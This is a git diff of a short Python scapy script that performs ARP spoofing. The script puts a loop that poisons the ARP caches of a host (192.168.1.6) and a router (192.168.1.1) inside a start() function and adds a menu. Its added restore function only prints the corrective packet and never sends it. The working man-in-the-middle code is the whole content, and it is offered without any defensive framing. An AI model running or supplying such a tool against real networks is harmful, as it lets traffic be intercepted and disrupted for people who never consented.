@@ -16,7 +16,7 @@ import time
     #     client_dict = {"ip":element[1].psrc,"mac":element[1].hwsrc}
     #     client_list.append(client_dict)
     # return client_list
-    
+
 def get_mac(ip):
     mac = "xx"
     while mac == "xx":
@@ -32,6 +32,14 @@ def get_mac(ip):
         finally:
             return mac
 
+def restore(destination_ip,source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
+    print(packet.show())
+    print(packet.summary())
+
+
 def spoof(target_ip,spoof_ip):    
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
@@ -39,10 +47,20 @@ def spoof(target_ip,spoof_ip):
     # print(packet.summary())
     scapy.send(packet,verbose=False)
 
-count = 0 
-while True:
-    spoof("192.168.1.6","192.168.1.1")
-    spoof("192.168.1.1","192.168.1.6")
-    print("Packet Counts : ",count)
-    count = count + 1
-    time.sleep(2)
+def start():
+    count = 0 
+    while True:
+        spoof("192.168.1.6","192.168.1.1")
+        spoof("192.168.1.1","192.168.1.6")
+        print("Packet Counts : ",count)
+        count = count + 1
+        time.sleep(2)
+def stop():
+    restore("192.168.1.6","192.168.1.1")#restore(target ip , router ip )
+
+print("1.start \n 2. restore")
+n = int(input("enter ur value : "))
+if n == 1 : 
+    start()
+else : 
+    stop()
